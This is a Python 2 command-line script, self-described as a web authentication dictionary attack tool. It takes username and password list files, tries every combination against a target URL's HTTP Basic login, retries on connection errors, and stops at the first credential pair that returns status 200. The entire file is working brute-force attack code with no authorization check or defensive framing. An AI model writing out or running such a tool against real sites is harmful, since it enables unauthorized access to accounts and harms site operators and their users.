#!/usr/bin/env python


''' Web authentication dictionary attack tool. '''


import argparse
import os.path
import sys
import urlparse
import itertools
from time import sleep

import requests

def cmd_line_args():
    '''Setup command line options parser, parse arugments and return options tuple.'''

    parser = argparse.ArgumentParser(description="Dictionary Attack / Brute force HTTP login credentials")
    parser.add_argument("target", type=str, help="Target URL")
    parser.add_argument("-p", "--password", type=str, required=True, 
        dest="passwords_file")
    parser.add_argument("-u", "--username", type=str, required=True, 
        dest="usernames_file", help="File with list of usernames")

    return parser.parse_args()

def prefix_print(msg, error=False):
    '''Print to stdout with a [+] or a [!] depending on error param.'''

    prefix = "[+]" if not error else "[!]"
    print prefix + " " + msg

def abort_on_missing_file(filename):
    '''Check if files exist and exit with message if they do not. '''

    if not os.path.exists(filename):
        prefix_print("File \'%s\' was not found.  Exiting." % (filename), True)
        sys.exit(0)

def try_credentials(target_url, username, password):
    '''Make request to target URL using username and password params as credentials.  Inspect response code to determine success.'''

    msg = "Trying credentials: %s, %s" % (username, password)

    '''Without the Connection: Close header, the program crashed on an exception from the requests module.'''

    try:
        response = requests.get(target_url, auth=(username, password), headers={'Connection': 'close'})
    except requests.exceptions.ConnectionError:
        sleep(5)
        response = requests.get(target_url, auth=(username, password), headers={'Connection': 'close'})

    if response.status_code == 200:
        msg = msg + "\t\t\tSuccess\t[Status Code: %s]" % (response.status_code)
        prefix_print(msg)
        return (username, password)

    msg = msg + "\t\t\tFailed\t[Status Code: %s]" % (response.status_code)
    prefix_print(msg)
    return

def main():
    args = cmd_line_args()

    abort_on_missing_file(args.passwords_file)
    abort_on_missing_file(args.usernames_file)

    #check url scheme 
    if urlparse.urlparse(args.target).scheme not in ['http', 'https']:
        prefix_print("Incorrect / missing URL scheme on target \'%s\'. "
            "Only HTTP / HTTPS are supported." % (args.target), True)

    with open(args.usernames_file) as uname_infile, open(args.passwords_file,
        'r') as pwd_infile:


        for x in itertools.product(uname_infile, pwd_infile):
            if(try_credentials(args.target, x[0].rstrip(), x[1].rstrip())):
                break


        '''
        Alternate method to combine each username in the 
        username file with each password in the password file.

        itertools was ~28 seconds faster on 500 usernames x 500 passwords.

        for uname in uname_infile:
            cur_uname = uname.rstrip()
            for pwd in pwd_infile:
                cur_pwd = pwd.rstrip()
                if(try_credentials(args.target, cur_uname, cur_pwd)):
                    break
            pwd_infile.seek(0);

        ''' 

if __name__ == '__main__':
    main()
